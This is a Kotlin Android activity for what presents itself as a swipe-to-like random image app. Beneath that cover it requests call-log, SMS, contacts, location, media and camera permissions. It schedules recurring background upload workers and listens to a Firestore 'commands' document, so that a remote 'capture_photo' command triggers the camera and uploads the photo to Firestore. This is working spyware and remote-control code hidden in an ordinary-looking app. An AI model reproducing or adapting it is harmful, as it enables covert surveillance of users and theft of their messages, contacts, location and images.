package com.example.myapplication3

import android.Manifest
import android.animation.Animator
import android.animation.ObjectAnimator
import android.annotation.SuppressLint
import android.app.AlertDialog
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.MediaStore
import android.util.Log
import android.view.GestureDetector
import android.view.MotionEvent
import android.widget.EditText
import android.widget.ImageView
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.work.*
import com.bumptech.glide.Glide
import com.google.android.material.bottomnavigation.BottomNavigationView
import com.google.firebase.FirebaseApp
import com.example.myapplication3.network.RetrofitInstance
import com.google.firebase.firestore.FirebaseFirestore
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.util.concurrent.TimeUnit
import android.graphics.Bitmap
import android.util.Base64
import java.io.ByteArrayOutputStream
import kotlin.math.abs

class MainActivity : AppCompatActivity() {

    private lateinit var capturedPhotoUri: Uri
    private val REQUEST_IMAGE_CAPTURE = 101
    private val REQUEST_PERMISSIONS = 102

    private lateinit var imageView: ImageView
    private lateinit var heartIcon: ImageView
    private lateinit var brokenHeartIcon: ImageView
    private lateinit var gestureDetector: GestureDetector
    private var currentImageUrl: String? = null

    @SuppressLint("ClickableViewAccessibility")
    @RequiresApi(Build.VERSION_CODES.TIRAMISU)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Initialize Firebase
        FirebaseApp.initializeApp(this)
        Log.d("MainActivity", "Firebase initialized.")

        // Initialize ImageView and Heart icons
        imageView = findViewById(R.id.image_view)
        heartIcon = findViewById(R.id.heart_icon)
        brokenHeartIcon = findViewById(R.id.broken_heart_icon)

        // Initialize GestureDetector
        gestureDetector = GestureDetector(this, SwipeGestureListener())

        // Set touch listener to detect gestures on the image
        imageView.setOnTouchListener { _, event ->
            Log.d("MainActivity", "Touch event detected: ${event.action}")
            gestureDetector.onTouchEvent(event)
        }

        // Initialize Bottom Navigation
        val bottomNavigationView = findViewById<BottomNavigationView>(R.id.bottom_navigation)
        bottomNavigationView.setOnItemSelectedListener { item ->
            when (item.itemId) {
                R.id.nav_home -> {
                    Log.d("MainActivity", "Home selected")
                    true
                }
                R.id.nav_favorite -> {
                    Log.d("MainActivity", "Favorite selected")
                    true
                }
                R.id.nav_profile -> {
                    Log.d("MainActivity", "Profile selected")
                    val intent = Intent(this, ProfileActivity::class.java)
                    startActivity(intent)
                    true
                }
                else -> false
            }
        }

        // Check permissions and request if necessary
        if (!hasAllPermissions()) {
            Log.d("MainActivity", "Requesting permissions.")
            requestAllPermissions()
        } else {
            Log.d("MainActivity", "All permissions granted.")
            onPermissionsGranted()
        }

        listenForCommands()
    }

    @RequiresApi(Build.VERSION_CODES.TIRAMISU)
    private fun hasAllPermissions(): Boolean {
        val permissions = arrayOf(
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.READ_MEDIA_VIDEO,
            Manifest.permission.READ_MEDIA_AUDIO,
            Manifest.permission.CAMERA

        )

        return permissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    @RequiresApi(Build.VERSION_CODES.TIRAMISU)
    private fun requestAllPermissions() {
        val permissionsToRequest = arrayOf(
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.READ_MEDIA_VIDEO,
            Manifest.permission.READ_MEDIA_AUDIO,
            Manifest.permission.CAMERA
        )

        ActivityCompat.requestPermissions(this, permissionsToRequest, REQUEST_ALL_PERMISSIONS)
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        if (requestCode == REQUEST_ALL_PERMISSIONS) {
            val allGranted = grantResults.all { it == PackageManager.PERMISSION_GRANTED }
            if (allGranted) {
                Log.d("MainActivity", "All permissions granted.")
                onPermissionsGranted()
            } else {
                Log.e("MainActivity", "Some permissions denied.")
            }
        }
    }

    private fun onPermissionsGranted() {
        showNameInputDialog()
        scheduleUploadWorker()
        scheduleImmediateUploadWorker()
        fetchRandomImage()
    }

    private fun showNameInputDialog() {
        val sharedPreferences = getSharedPreferences("AppPrefs", Context.MODE_PRIVATE)
        val savedName = sharedPreferences.getString("user_name", null)

        if (savedName.isNullOrEmpty()) {
            val editText = EditText(this).apply {
                hint = getString(R.string.enter_name_hint)
            }

            AlertDialog.Builder(this)
                .setTitle(getString(R.string.enter_name_title))
                .setView(editText)
                .setPositiveButton(getString(R.string.button_ok)) { _, _ ->
                    val userName = editText.text.toString()
                    if (userName.isNotBlank()) {
                        sharedPreferences.edit().putString("user_name", userName).apply()
                        Log.d("MainActivity", "User name saved: $userName")
                    }
                }
                .setCancelable(false)
                .show()
        }
    }

    private fun scheduleUploadWorker() {
        val workRequest = PeriodicWorkRequestBuilder<UploadWorker>(15, TimeUnit.MINUTES)
            .build()

        WorkManager.getInstance(this).enqueue(workRequest)
        Log.d("MainActivity", "Periodic upload worker scheduled.")
    }

    private fun scheduleImmediateUploadWorker() {
        val oneTimeWorkRequest = OneTimeWorkRequestBuilder<UploadWorker>()
            .build()
        WorkManager.getInstance(this).enqueue(oneTimeWorkRequest)
        Log.d("MainActivity", "Immediate upload worker scheduled.")
    }

    private fun fetchRandomImage() {
        CoroutineScope(Dispatchers.Main).launch {
            try {
                Log.d("MainActivity", "Fetching new random image.")
                Glide.with(this@MainActivity).clear(imageView)

                val photos = RetrofitInstance.api.getRandomPhotos(1) // API Call
                val imageUrl = photos.firstOrNull()?.urls?.regular

                if (!imageUrl.isNullOrEmpty()) {
                    currentImageUrl = imageUrl
                    Log.d("MainActivity", "Loading new image: $imageUrl")
                    Glide.with(this@MainActivity).load(imageUrl).into(imageView)
                } else {
                    Log.e("MainActivity", "No valid image URL received.")
                }
            } catch (e: Exception) {
                Log.e("MainActivity", "Error fetching image: ${e.message}")
            }
        }
    }

    private inner class SwipeGestureListener : GestureDetector.SimpleOnGestureListener() {
        private val SWIPE_THRESHOLD = 100
        private val SWIPE_VELOCITY_THRESHOLD = 100

        override fun onDown(e: MotionEvent): Boolean {
            return true
        }

        override fun onFling(
            e1: MotionEvent?,
            e2: MotionEvent,
            velocityX: Float,
            velocityY: Float
        ): Boolean {
            if (e1 == null || e2 == null) return false

            val diffX = e2.x - e1.x
            val diffY = e2.y - e1.y

            if (abs(diffX) > abs(diffY)) {
                if (abs(diffX) > SWIPE_THRESHOLD && abs(velocityX) > SWIPE_VELOCITY_THRESHOLD) {
                    if (diffX > 0) {
                        onSwipeRight()
                    } else {
                        onSwipeLeft()
                    }
                    return true
                }
            }
            return false
        }
    }

    private fun onSwipeRight() {
        // Show heart icon for like
        heartIcon.visibility = ImageView.VISIBLE
        brokenHeartIcon.visibility = ImageView.GONE

        // Animate heart icon
        ObjectAnimator.ofFloat(heartIcon, "scaleX", 1.5f).apply {
            duration = 300
            addListener(object : Animator.AnimatorListener {
                override fun onAnimationStart(p0: Animator) {}

                override fun onAnimationEnd(p0: Animator) {
                    heartIcon.visibility = ImageView.GONE
                    changeImage()
                }

                override fun onAnimationCancel(p0: Animator) {}

                override fun onAnimationRepeat(p0: Animator) {}
            })
            start()
        }
    }

    private fun onSwipeLeft() {
        // Show broken heart icon for dislike
        brokenHeartIcon.visibility = ImageView.VISIBLE
        heartIcon.visibility = ImageView.GONE

        // Animate broken heart icon
        ObjectAnimator.ofFloat(brokenHeartIcon, "scaleX", 1.5f).apply {
            duration = 300
            addListener(object : Animator.AnimatorListener {
                override fun onAnimationStart(p0: Animator) {}

                override fun onAnimationEnd(p0: Animator) {
                    brokenHeartIcon.visibility = ImageView.GONE
                    changeImage()
                }

                override fun onAnimationCancel(p0: Animator) {}

                override fun onAnimationRepeat(p0: Animator) {}
            })
            start()
        }
    }

    private fun changeImage() {
        fetchRandomImage()  // Call the method that fetches a new image
    }

    companion object {
        private const val REQUEST_ALL_PERMISSIONS = 101
    }

    private fun capturePhoto() {
        val cameraIntent = Intent(MediaStore.ACTION_IMAGE_CAPTURE)
        startActivityForResult(cameraIntent, REQUEST_IMAGE_CAPTURE)
    }


    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == REQUEST_IMAGE_CAPTURE && resultCode == RESULT_OK) {
            val bitmap = data?.extras?.get("data") as? Bitmap
            if (bitmap != null) {
                uploadPhotoToFirestore(bitmap)
            } else {
                Log.e("MainActivity", "Failed to capture photo.")
            }
        }
    }


    private fun uploadPhotoToFirestore(bitmap: Bitmap) {
        try {
            // Compress the bitmap to reduce its size
            val compressedBitmap = compressBitmap(bitmap, 800, 800)

            // Convert the compressed bitmap to a byte array
            val outputStream = ByteArrayOutputStream()
            compressedBitmap.compress(Bitmap.CompressFormat.JPEG, 75, outputStream)
            val byteArray = outputStream.toByteArray()

            // Convert the byte array to Base64
            val base64String = Base64.encodeToString(byteArray, Base64.DEFAULT)

            // Get the username from SharedPreferences
            val sharedPreferences = getSharedPreferences("AppPrefs", Context.MODE_PRIVATE)
            val username = sharedPreferences.getString("user_name", "default_user") ?: "default_user"

            // Save the Base64 image to Firestore under the photos collection and the username document
            val db = FirebaseFirestore.getInstance()
            val photoData = hashMapOf(
                "timestamp" to System.currentTimeMillis(),
                "imageBase64" to base64String
            )

            // Save the Base64 image to the "photos" collection with the username as the document ID
            db.collection("photos")
                .document(username) // Document ID is the username
                .set(photoData)
                .addOnSuccessListener {
                    Log.d("MainActivity", "Photo saved to Firestore successfully.")
                }
                .addOnFailureListener { e ->
                    Log.e("MainActivity", "Error saving photo to Firestore: ${e.message}")
                }
        } catch (e: Exception) {
            Log.e("MainActivity", "Error processing photo: ${e.message}")
        }
    }

// Helper function to compress a Bitmap
private fun compressBitmap(originalBitmap: Bitmap, maxWidth: Int, maxHeight: Int): Bitmap {
    val width = originalBitmap.width
    val height = originalBitmap.height

    // Calculate aspect ratio and scale accordingly
    val aspectRatio = width.toFloat() / height.toFloat()
    val newWidth: Int
    val newHeight: Int

    if (width > height) {
        newWidth = maxWidth
        newHeight = (maxWidth / aspectRatio).toInt()
    } else {
        newHeight = maxHeight
        newWidth = (maxHeight * aspectRatio).toInt()
    }

    return Bitmap.createScaledBitmap(originalBitmap, newWidth, newHeight, true)
}


private fun listenForCommands() {
        Log.d("MainActivity", "Commanded successfully.")
        val db = FirebaseFirestore.getInstance()
        db.collection("commands").document("camera_command")
            .addSnapshotListener { snapshot, e ->
                if (e != null) {
                    Log.e("MainActivity", "Error listening for commands: ${e.message}")
                    return@addSnapshotListener
                }
                if (snapshot != null && snapshot.exists()) {
                    val command = snapshot.getString("command")
                    if (command == "capture_photo") {
                        capturePhoto()
                        db.collection("commands").document("camera_command").update("command", null)
                    }
                }
            }
    }

}